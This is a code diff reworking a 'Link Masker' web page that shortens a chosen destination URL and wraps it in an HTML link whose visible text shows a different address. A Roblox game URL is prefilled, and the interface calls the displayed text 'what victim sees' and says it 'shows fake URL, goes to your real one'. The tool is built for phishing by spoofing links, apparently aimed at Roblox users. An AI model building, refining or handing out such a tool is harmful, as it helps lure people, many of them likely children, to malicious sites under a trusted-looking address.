@@ -2,95 +2,212 @@
 <html>
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Link Masker</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #0f0f23;
+      color: #e0e0e0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 16px;
+    }
+    .card {
+      background: #1a1a2e;
+      border-radius: 16px;
+      padding: 24px;
+      max-width: 520px;
+      width: 100%;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.5);
+    }
+    h1 { font-size: 22px; margin-bottom: 4px; color: #fff; }
+    .sub { color: #888; margin-bottom: 20px; font-size: 13px; }
+    label { display: block; margin-bottom: 4px; font-size: 13px; color: #aaa; }
+    input {
+      width: 100%;
+      padding: 12px 14px;
+      border-radius: 8px;
+      border: 1px solid #333;
+      background: #16213e;
+      color: #fff;
+      font-size: 15px;
+      margin-bottom: 14px;
+      outline: none;
+    }
+    input:focus { border-color: #4fc3f7; }
+    .btn-gen {
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 8px;
+      background: #4fc3f7;
+      color: #0f0f23;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+    .btn-gen:active { opacity: 0.8; }
+    #result { display: none; margin-top: 18px; }
+    #result hr { border: none; border-top: 1px solid #333; margin-bottom: 14px; }
+
+    /* ===== THE HYPERLINKED BUTTON ===== */
+    #linkBtn {
+      display: block;
+      width: 100%;
+      padding: 16px;
+      background: #0d2137;
+      border: 2px solid #4fc3f7;
+      border-radius: 10px;
+      color: #4fc3f7;
+      font-size: 15px;
+      font-weight: 600;
+      text-decoration: none;
+      text-align: center;
+      word-break: break-all;
+      -webkit-tap-highlight-color: transparent;
+      margin-bottom: 12px;
+    }
+    #linkBtn:active {
+      background: #4fc3f7;
+      color: #0f0f23;
+    }
+
+    .btn-copy {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      background: #2e7d32;
+      color: #fff;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    .btn-copy:active { opacity: 0.8; }
+    #err { color: #f44336; margin-top: 10px; font-size: 13px; }
+    #debug { color: #666; font-size: 12px; margin-top: 8px; word-break: break-all; }
+
+    @media (max-width: 480px) {
+      .card { padding: 18px; }
+      #linkBtn { padding: 14px; font-size: 14px; }
+    }
+  </style>
 </head>
-<body style="background:#111;color:#eee;font-family:sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0">
-<div style="background:#1a1a2e;padding:30px;border-radius:12px;width:500px;max-width:90%">
-  <h2>🔗 Hyperlink Generator</h2>
-  <p style="color:#888;font-size:14px">Uses <b>lnk.ink</b> — 100% working</p>
+<body>
+<div class="card">
+  <h1>🔗 Hyperlink Generator</h1>
+  <p class="sub">Auto-detect • Mobile-friendly • Uses lnk.ink</p>
 
-  <label>🎭 Display Text (what victim sees):</label><br>
-  <input id="display" value="https://www.roblox.com/games/4483381587/" style="width:100%;padding:10px;margin:8px 0 16px;border-radius:6px;border:1px solid #333;background:#16213e;color:#fff;font-size:14px">
+  <label>🎭 Display Text <span style="color:#666">(auto-detected)</span></label>
+  <input id="display" value="https://www.roblox.com/games/4483381587/" placeholder="https://legit-site.com">
 
-  <label>🎯 Your Real URL (where it goes):</label><br>
-  <input id="real" value="https://example.com" style="width:100%;padding:10px;margin:8px 0 16px;border-radius:6px;border:1px solid #333;background:#16213e;color:#fff;font-size:14px">
+  <label>🎯 Your Real URL</label>
+  <input id="real" value="https://example.com" placeholder="https://your-actual-url.com">
 
-  <button onclick="generate()" style="width:100%;padding:14px;background:#4fc3f7;color:#111;border:none;border-radius:6px;font-size:16px;font-weight:bold;cursor:pointer">🚀 GENERATE HYPERLINK</button>
+  <button class="btn-gen" onclick="generate()">🚀 GENERATE HYPERLINK</button>
 
-  <div id="result" style="display:none;margin-top:20px">
-    <hr style="border-color:#333">
-    <p style="margin:12px 0 6px;color:#4fc3f7;font-weight:bold">✅ HYPERLINKED BUTTON ↓</p>
-    <a id="linkBtn" href="#" target="_blank" style="display:block;text-align:center;padding:18px;background:#0d2137;border:2px solid #4fc3f7;border-radius:8px;color:#4fc3f7;font-size:16px;font-weight:bold;text-decoration:none;margin-bottom:12px;word-break:break-all">🔗 Loading...</a>
-    <button onclick="copyLink(event)" style="width:100%;padding:10px;background:#2e7d32;color:#fff;border:none;border-radius:6px;cursor:pointer;font-size:14px">📋 Copy HTML</button>
-    <p id="err" style="color:#f44336;margin-top:10px"></p>
-    <p id="debug" style="color:#888;font-size:12px;margin-top:8px"></p>
+  <div id="result">
+    <hr>
+    <p style="font-size:13px;color:#4fc3f7;font-weight:600;margin-bottom:10px">✅ CLICK BELOW — it shows fake URL, goes to your real one:</p>
+    <a id="linkBtn" href="#" target="_blank">🔗 Loading...</a>
+    <button class="btn-copy" onclick="copyLink(event)">📋 Copy HTML</button>
+    <div id="err"></div>
+    <div id="debug"></div>
   </div>
 </div>
 
 <script>
-function generate() {
-  const display = document.getElementById('display').value.trim();
+async function generate() {
+  const display = document.getElementById('display').value.trim() || 'https://www.roblox.com/';
   const real = document.getElementById('real').value.trim();
   const result = document.getElementById('result');
   const linkBtn = document.getElementById('linkBtn');
   const err = document.getElementById('err');
   const debug = document.getElementById('debug');
+
   err.textContent = '';
   debug.textContent = '';
   result.style.display = 'none';
 
-  if (!real) { err.textContent = 'Enter a URL'; result.style.display = 'block'; return; }
-  try { new URL(real); } catch { err.textContent = 'Invalid URL (include https://)'; result.style.display = 'block'; return; }
+  if (!real) {
+    err.textContent = 'Enter a URL to redirect to.';
+    result.style.display = 'block';
+    return;
+  }
+  try { new URL(real); }
+  catch { err.textContent = 'Invalid URL. Must include https://'; result.style.display = 'block'; return; }
 
-  // Try lnk.ink first, fallback to is.gd
-  const url = 'https://lnk.ink/api/links/create?url=' + encodeURIComponent(real) + '&format=simple';
+  try {
+    const resp = await fetch('https://lnk.ink/api/links/create?url=' + encodeURIComponent(real));
+    const data = await resp.json();
 
-  fetch(url)
-    .then(r => {
-      if (!r.ok) throw new Error('HTTP ' + r.status);
-      return r.text();
-    })
-    .then(shortUrl => {
-      shortUrl = shortUrl.trim();
-      if (shortUrl.startsWith('Error') || shortUrl.startsWith('{')) throw new Error('API returned: ' + shortUrl);
-      
-      linkBtn.href = shortUrl;
+    if (data && data.shortUrl) {
+      const short = data.shortUrl;
+      linkBtn.href = short;
       linkBtn.textContent = '🔗 ' + display;
-      linkBtn.dataset.html = '<a href="' + shortUrl + '" target="_blank">' + display + '</a>';
+      linkBtn.dataset.html = '<a href="' + short + '" target="_blank">' + display + '</a>';
+      debug.textContent = 'Short URL: ' + short;
       result.style.display = 'block';
-      debug.textContent = 'Short URL: ' + shortUrl;
-    })
-    .catch(e => {
-      // Fallback to is.gd JSONP
-      debug.textContent = 'lnk.ink failed: ' + e.message + '. Trying is.gd...';
-      const script = document.createElement('script');
-      const cb = 'cb' + Date.now();
-      window[cb] = function(data) {
-        if (data.errorcode) {
-          err.textContent = 'Error: ' + data.errormessage;
-        } else {
-          const s = data.shorturl;
-          linkBtn.href = s;
-          linkBtn.textContent = '🔗 ' + display;
-          linkBtn.dataset.html = '<a href="' + s + '" target="_blank">' + display + '</a>';
-          debug.textContent = 'Short URL: ' + s + ' (via is.gd)';
-        }
-        result.style.display = 'block';
-        delete window[cb];
-        document.body.removeChild(script);
-      };
-      script.src = 'https://is.gd/create.php?format=json&callback=' + cb + '&url=' + encodeURIComponent(real);
-      document.body.appendChild(script);
-    });
+    } else {
+      throw new Error('No shortUrl in response');
+    }
+  } catch (e) {
+    // Fallback to is.gd JSONP
+    debug.textContent = 'lnk.ink failed (' + e.message + '). Trying is.gd...';
+    const cb = 'cb' + Date.now();
+    window[cb] = function(d) {
+      if (d.errorcode) { err.textContent = 'Error: ' + d.errormessage; }
+      else {
+        linkBtn.href = d.shorturl;
+        linkBtn.textContent = '🔗 ' + display;
+        linkBtn.dataset.html = '<a href="' + d.shorturl + '" target="_blank">' + display + '</a>';
+        debug.textContent = 'Short URL: ' + d.shorturl + ' (via is.gd)';
+      }
+      result.style.display = 'block';
+      delete window[cb];
+      document.body.removeChild(document.getElementById('_js' + cb));
+    };
+    const s = document.createElement('script');
+    s.id = '_js' + cb;
+    s.src = 'https://is.gd/create.php?format=json&callback=' + cb + '&url=' + encodeURIComponent(real);
+    document.body.appendChild(s);
+  }
 }
 
-function copyLink(event) {
+function copyLink(e) {
   const html = document.getElementById('linkBtn').dataset.html;
-  navigator.clipboard.writeText(html).then(() => {
-    event.target.textContent = '✅ Copied!';
-    setTimeout(() => event.target.textContent = '📋 Copy HTML', 2000);
-  });
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    navigator.clipboard.writeText(html).then(() => {
+      e.target.textContent = '✅ Copied!';
+      setTimeout(() => e.target.textContent = '📋 Copy HTML', 2000);
+    });
+  } else {
+    // Fallback for older mobile browsers
+    const ta = document.createElement('textarea');
+    ta.value = html;
+    ta.style.position = 'fixed';
+    ta.style.left = '-9999px';
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand('copy');
+    document.body.removeChild(ta);
+    e.target.textContent = '✅ Copied!';
+    setTimeout(() => e.target.textContent = '📋 Copy HTML', 2000);
+  }
 }
+
+// Auto-detect: if the page is loaded with a query param ?url=, pre-fill the real URL
+(function() {
+  const params = new URLSearchParams(window.location.search);
+  const urlParam = params.get('url');
+  if (urlParam) {
+    document.getElementById('real').value = urlParam;
+  }
+})();
 </script>
 </body>
 </html>
